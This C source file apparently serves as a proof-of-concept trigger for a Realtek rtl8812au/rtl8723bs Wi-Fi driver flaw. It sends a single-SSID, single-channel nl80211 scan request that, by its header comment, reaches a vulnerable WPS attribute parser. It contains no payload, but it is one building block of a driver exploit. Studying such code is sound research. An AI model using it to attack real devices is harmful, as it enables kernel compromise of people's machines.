/*
 * trigger_scan.c — Send a nl80211 scan request with exactly:
 *   n_ssids=1, ssid_len>0, n_channels=1
 *
 * This satisfies the rtw_cfg80211_is_target_wps_scan() condition in the
 * rtl8812au/rtl8723bs driver, reaching the vulnerable
 * rtw_get_wps_attr_content() call on the scan path.
 *
 * Build:
 *   gcc -o trigger_scan trigger_scan.c -lnl-genl-3 -lnl-3 \
 *       $(pkg-config --cflags libnl-genl-3.0)
 *
 * Usage:
 *   sudo ./trigger_scan wlx180206005500 DOESNOTEXIST 2412
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <net/if.h>

#include <netlink/netlink.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>

#include <linux/nl80211.h>

static int error_handler(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg)
{
	int *ret = arg;
	*ret = err->error;
	return NL_STOP;
}

static int ack_handler(struct nl_msg *msg, void *arg)
{
	int *ret = arg;
	*ret = 0;
	return NL_STOP;
}

int main(int argc, char *argv[])
{
	struct nl_sock *sock;
	struct nl_msg *msg;
	struct nl_cb *cb;
	struct nlattr *ssids, *freqs;
	int family_id, ifindex, err;
	int ret = 1;
	const char *ifname, *ssid;
	unsigned int freq;

	if (argc < 4) {
		fprintf(stderr, "Usage: %s <interface> <ssid> <freq_mhz>\n", argv[0]);
		fprintf(stderr, "  e.g. %s wlx180206005500 DOESNOTEXIST 2412\n", argv[0]);
		return 1;
	}

	ifname = argv[1];
	ssid = argv[2];
	freq = atoi(argv[3]);

	ifindex = if_nametoindex(ifname);
	if (!ifindex) {
		fprintf(stderr, "Interface %s not found\n", ifname);
		return 1;
	}

	sock = nl_socket_alloc();
	if (!sock) {
		fprintf(stderr, "Failed to allocate netlink socket\n");
		return 1;
	}

	if (genl_connect(sock)) {
		fprintf(stderr, "Failed to connect to generic netlink\n");
		goto out_sock;
	}

	family_id = genl_ctrl_resolve(sock, "nl80211");
	if (family_id < 0) {
		fprintf(stderr, "nl80211 not found\n");
		goto out_sock;
	}

	msg = nlmsg_alloc();
	if (!msg) {
		fprintf(stderr, "Failed to allocate message\n");
		goto out_sock;
	}

	cb = nl_cb_alloc(NL_CB_DEFAULT);
	if (!cb) {
		fprintf(stderr, "Failed to allocate callback\n");
		goto out_msg;
	}

	genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0,
		     0, NL80211_CMD_TRIGGER_SCAN, 0);

	nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex);

	/* Exactly 1 SSID */
	ssids = nla_nest_start(msg, NL80211_ATTR_SCAN_SSIDS);
	nla_put(msg, 1, strlen(ssid), ssid);
	nla_nest_end(msg, ssids);

	/* Exactly 1 frequency */
	freqs = nla_nest_start(msg, NL80211_ATTR_SCAN_FREQUENCIES);
	nla_put_u32(msg, 1, freq);
	nla_nest_end(msg, freqs);

	printf("[+] Sending NL80211_CMD_TRIGGER_SCAN:\n");
	printf("    interface: %s (ifindex=%d)\n", ifname, ifindex);
	printf("    n_ssids=1, ssid=\"%s\" (len=%zu)\n", ssid, strlen(ssid));
	printf("    n_channels=1, freq=%u MHz\n", freq);

	err = nl_send_auto(sock, msg);
	if (err < 0) {
		fprintf(stderr, "Failed to send: %s\n", nl_geterror(err));
		goto out_cb;
	}

	nl_cb_err(cb, NL_CB_CUSTOM, error_handler, &ret);
	nl_cb_set(cb, NL_CB_ACK, NL_CB_CUSTOM, ack_handler, &ret);

	ret = 1;
	while (ret > 0)
		nl_recvmsgs(sock, cb);

	if (ret == 0)
		printf("[+] Scan triggered successfully\n");
	else
		fprintf(stderr, "[-] Scan failed: %s (%d)\n", strerror(-ret), ret);

out_cb:
	nl_cb_put(cb);
out_msg:
	nlmsg_free(msg);
out_sock:
	nl_socket_free(sock);
	return ret ? 1 : 0;
}
